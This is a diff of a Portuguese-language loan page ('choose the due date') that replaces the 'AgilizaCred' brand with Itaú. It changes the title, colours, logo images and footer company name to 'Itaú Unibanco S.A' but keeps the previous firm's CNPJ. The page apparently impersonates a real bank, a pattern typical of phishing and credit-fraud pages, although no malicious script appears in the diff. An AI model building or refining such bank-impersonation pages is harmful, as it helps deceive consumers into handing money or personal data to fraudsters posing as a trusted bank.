@@ -10,15 +10,15 @@
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Escolha o Vencimento — AgilizaCred</title>
+  <title>Escolha o Vencimento — Itaú</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
 
     :root {
-      --green: #22C55E;
-      --green-dark: #16A34A;
-      --green-light: #DCFCE7;
-      --green-subtle: #F0FDF4;
+      --green: #ff6200;
+      --green-dark: #ff6200;
+      --green-light: #fff8f3;
+      --green-subtle: #fff0e4;
       --bg: #F4F5F7;
       --card: #FFFFFF;
       --text: #111827;
@@ -66,8 +66,29 @@
     .menu-icon:hover{ background: var(--border); transform: scale(1.05); }
     .menu-icon svg{ width: 18px; height: 18px; color: var(--text-mid); stroke-width: 2.5; }
 
+    /* ✅ NOVO: logo em imagem (header/rodapé) */
+    .brand-logo{
+      display:flex;
+      align-items:center;
+      user-select:none;
+      text-decoration:none;
+      line-height:0;
+    }
+    .brand-logo img{
+      display:block;
+      height: 47px; /* ajuste se quiser */
+      width:auto;
+      max-width: 190px;
+      object-fit: contain;
+    }
+    .footer-logo-img img{
+      height: 20px; /* ajuste se quiser */
+      max-width: 180px;
+      opacity: 0.95;
+    }
+
     .logo{ display: flex; align-items: center; user-select: none; }
-        .logo-cred{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
+    .logo-cred{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
     .logo-diamond{ width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
     .logo-on{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#22C55E; letter-spacing:-0.5px; line-height:1; }
 
@@ -214,7 +235,7 @@
       display:flex; flex-direction:column; align-items:center; gap:10px;
     }
     .footer-logo{ display:flex; align-items:center; user-select:none; }
-        .footer-logo .logo-cred{ font-size:15px; color:#6B7280; }
+    .footer-logo .logo-cred{ font-size:15px; color:#6B7280; }
     .footer-logo .logo-diamond{ width:5px; height:5px; margin:0 6px; background:#6B7280; }
     .footer-logo .logo-on{ font-size:15px; color:#22C55E; }
     footer small{ font-size:11px; opacity:0.75; line-height:1.5; }
@@ -238,7 +259,7 @@
       .info-icon svg{ width:18px; height:18px; }
       .info-text{ font-size: 0.8rem; }
     }
-      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
     .logo-row { display:flex; align-items:center; }
     .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
     .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
@@ -253,7 +274,19 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
           </svg>
         </div>
-        <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+
+        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+        <a class="brand-logo" href="#" aria-label="Itaú">
+          <img src="/images/itau2.png" alt="Itaú">
+        </a>
+
+        <!-- (se quiser manter a logo antiga também, descomente) -->
+        <!--
+        <div class="logo-wrap">
+          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
+          <span class="logo-tagline">Crédito Fácil</span>
+        </div>
+        -->
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -345,10 +378,14 @@
 
   <footer class="site-footer">
     <div class="footer-inner">
-      <div class="footer-logo">
-        <span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span>
-      </div>
-      <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+
+      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú">
+        <img src="/images/itau2.png" alt="Itaú">
+      </a>
+
+      <small><strong>Itaú Unibanco S.A</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+
       <div class="footer-badges">
         <span>
           <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
@@ -422,6 +459,5 @@
       }, 1500);
     }
   </script>
-
 
 </body></html>
